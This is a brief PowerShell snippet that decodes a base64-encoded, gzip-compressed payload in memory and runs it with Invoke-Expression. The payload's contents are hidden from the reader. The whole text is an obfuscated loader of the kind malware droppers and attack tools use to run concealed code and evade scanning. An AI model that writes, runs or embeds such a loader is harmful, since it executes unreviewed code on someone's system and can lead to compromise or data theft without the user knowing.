$d = New-Object System.IO.Compression.GzipStream (New-Object System.IO.MemoryStream (,[Convert]::FromBase64String('H4sIAAAAAAAEAK1TTUvDQBB9Z8H/sJQc9NAe9BZZUEpRD5pilR5KkbRspULSsjGCiP/dN1Obr9pQQUKyk503b97bSRbIkWKONyyxYmRwDce3Lkb4QMbIIcEtMwvmDT5xjCOum2uNGJ53ghNMFO3Jk+IFUwTosyIhJlcWj3tFOtZZ3gGjFO8IiYtwhyGe8IgBHoi74vsAp7VeAdmyn9qtxjH5lqye4ZU74sJwTxSc4wzPzKy1c6z+RFfVlSHDfo379ddVzRXxN11Dsq2476glY+T/TUtMTDlLW5xbjwzVXLNONLjifLeueuyTs89Me0b8BvoFssow1rmLsi5utJ847hRx2OqhcxBXxNmFv7g8rLrUHTYc1+u9TjDnKuc34aRGrM2VR9RXZzrFJf8HU/SxLR4viBMHdke/ZEp1tjGNL1W3ebb9mZL/Bn9/Fs7MAwAA')), [System.IO.Compression.CompressionMode]::Decompress)
$o = New-Object System.IO.MemoryStream
$d.CopyTo($o)
Invoke-Expression ([System.Text.Encoding]::Unicode.GetString($o.ToArray()))
